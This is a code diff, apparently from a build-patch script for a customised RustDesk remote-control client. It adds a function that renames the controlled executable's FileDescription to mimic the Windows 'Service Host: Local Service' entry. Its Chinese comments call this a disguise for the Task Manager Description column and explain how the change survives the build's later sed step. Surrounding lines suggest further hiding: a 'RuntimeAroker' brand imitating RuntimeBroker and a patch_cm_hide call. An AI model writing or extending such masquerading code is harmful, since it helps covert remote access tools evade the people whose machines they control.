@@ -20,6 +20,34 @@ BRAND = 'RuntimeAroker'
 IMPORT_LINE = "import 'package:flutter_hbb/desktop/pages/agent_page.dart';"
 UNLOCK_WATCHER_MARK = 'hy_local_unlock_watcher'
 
+# 任务管理器「描述」列伪装（2026-11-27 用户要求）：把被控端 exe 版本资源的
+# FileDescription 改成系统服务样式。workflow 的 appname sed 会把
+# `FileDescription = "RustDesk Remote Desktop"` 替换为 appname，而本 patch 在
+# sed 之前执行（脚本第 264 行 vs sed 第 379 行），先把锚点改掉，sed 便匹配不到，
+# 于是伪装描述得以保留。只作用于被控端（管理端走 patch_client_ui.py，不受影响）。
+PROCESS_DESC = '服务主机:本地服务(网络受限）'
+
+
+def patch_file_description(root):
+    for rel in ('Cargo.toml', 'libs/portable/Cargo.toml'):
+        p = os.path.join(root, rel)
+        if not os.path.isfile(p):
+            print('skip missing (file description):', rel)
+            continue
+        with open(p, encoding='utf-8') as f:
+            src = f.read()
+        if PROCESS_DESC in src:
+            print('%s already patched (file description)' % rel)
+            continue
+        old = 'FileDescription = "RustDesk Remote Desktop"'
+        if old not in src:
+            print('skip (file description anchor missing):', rel)
+            continue
+        src = src.replace(old, 'FileDescription = "%s"' % PROCESS_DESC)
+        with open(p, 'w', encoding='utf-8', newline='\n') as f:
+            f.write(src)
+        print('patched %s: FileDescription -> %s' % (rel, PROCESS_DESC))
+
 
 def patch_main_dart(root):
     main_dart = os.path.join(root, 'flutter', 'lib', 'main.dart')
@@ -687,6 +715,7 @@ def main():
             raise SystemExit('agent_page.dart not found: %s' % page)
     patch_main_dart(root)
     patch_main_cpp(root)
+    patch_file_description(root)  # 进程描述伪装：任务管理器「描述」列（2026-11-27）
     patch_broker_exe(root)
     patch_privacy_local_unlock(root)
     patch_cm_hide(root)
